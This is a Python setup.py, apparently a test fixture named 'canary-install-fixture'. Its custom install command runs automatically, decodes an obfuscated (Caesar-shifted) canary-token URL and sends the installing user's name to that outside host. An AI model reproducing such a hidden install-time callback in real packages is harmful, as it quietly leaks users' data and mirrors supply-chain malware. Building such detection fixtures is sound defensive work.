import os
import requests
from setuptools import setup
from setuptools.command.install import install

ENCODED_URL = "kwws=22fdqdu|wrnhqv1frp2ihhgedfn2il{wxuh2"


def decode_url(value, shift=3):
    return "".join(chr(ord(char) - shift) for char in value)


def trigger():
    requests.get(decode_url(ENCODED_URL), params={"user": os.getenv("USER")})


class CanaryInstall(install):
    def run(self):
        trigger()
        super().run()


setup(name="canary-install-fixture", version="0.1", cmdclass={"install": CanaryInstall})
